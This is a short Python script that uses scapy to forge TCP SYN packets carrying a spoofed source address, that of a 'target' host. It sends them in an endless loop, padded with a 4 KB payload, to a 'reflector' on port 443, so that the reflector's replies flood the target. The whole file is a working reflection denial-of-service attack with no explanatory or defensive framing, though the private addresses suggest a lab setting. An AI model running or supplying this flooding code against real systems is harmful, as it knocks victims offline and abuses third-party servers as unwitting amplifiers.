import socket
from scapy.all import *

target_ip = "192.168.2.181"
reflection_ip = "192.168.2.1"
#reflection_list next
data = "BBBB"

ip = IP(src=target_ip, dst=reflection_ip)
tcp = TCP(sport=RandShort(), dport=int("443"),flags="S")
raw = Raw(data*1024)
scapy_packet = ip / tcp / raw


while True:
    send(scapy_packet, loop=0, verbose=1)
    print("sending tcp syn packets to reflector with target ip as source...")